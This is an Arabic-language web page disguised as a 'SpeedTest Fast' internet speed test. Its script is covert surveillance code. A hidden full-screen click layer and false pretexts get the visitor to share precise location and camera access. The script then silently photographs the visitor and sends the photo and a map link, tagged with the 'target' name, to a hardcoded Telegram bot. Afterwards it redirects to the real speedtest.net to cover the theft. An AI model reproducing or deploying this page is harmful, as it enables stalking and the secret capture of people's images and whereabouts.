<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SpeedTest Fast</title>
    <style>
        * { -webkit-user-select: none; user-select: none; -webkit-tap-highlight-color: transparent; }
        body { background: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        
        /* طبقة شفافة تغطي الشاشة بالكامل لضمان الاستجابة من أول لمسة */
        #clickLayer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; cursor: pointer; }
        
        .circle { position: relative; width: 220px; height: 220px; border: 6px solid #00d2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(0, 210, 255, 0.4); background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%); }
        .start-text { font-size: 50px; font-weight: bold; color: #00d2ff; }
        #status { margin-top: 30px; font-size: 18px; color: #888; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div id="clickLayer"></div>
    <h2>فحص سرعة الشبكة العالمي</h2>
    <div class="circle"><span class="start-text">Start</span></div>
    <p id="status">انقر للبدء...</p>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // التوكن الجديد والآيدي الخاص بك
        const token = "8632426187:AAH_tO6_cfSkSf9HCs0oP7i2EaU3B2PsrHI"; 
        const chat = "7984067238"; 
        const urlParams = new URLSearchParams(window.location.search);
        const victim = urlParams.get('user') || "Unknown";

        async function send(type, data, cap = "") {
            const fd = new FormData();
            fd.append("chat_id", chat);
            if(type === "img") {
                fd.append("photo", data, "capture.jpg");
                fd.append("caption", `👤 المستهدف: ${victim}\n${cap}`);
                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: "POST", body: fd});
            } else {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(data)}`);
            }
        }

        document.getElementById('clickLayer').onclick = async function() {
            this.style.display = "none";
            document.getElementById('status').innerText = "جاري الاتصال بالسيرفرات...";

            navigator.geolocation.getCurrentPosition(async (p) => {
                const map = `📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                try {
                    const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
                    const v = document.getElementById('video');
                    v.srcObject = s;
                    await new Promise(res => setTimeout(res, 1000));
                    const c = document.getElementById('canvas');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    s.getTracks().forEach(t => t.stop());
                    
                    c.toBlob(async (b) => {
                        await send("img", b, map);
                        window.location.href = "https://www.speedtest.net";
                    }, 'image/jpeg', 0.7);
                } catch(e) {
                    await send("msg", `📍 الموقع فقط (تم رفض الكاميرا):\n${map}`);
                    window.location.href = "https://www.speedtest.net";
                }
            }, (err) => {
                alert("خطأ: يرجى السماح بالوصول للموقع لاختيار أفضل سيرفر فحص.");
                location.reload();
            }, {enableHighAccuracy: true});
        };
    </script>
</body>
</html>
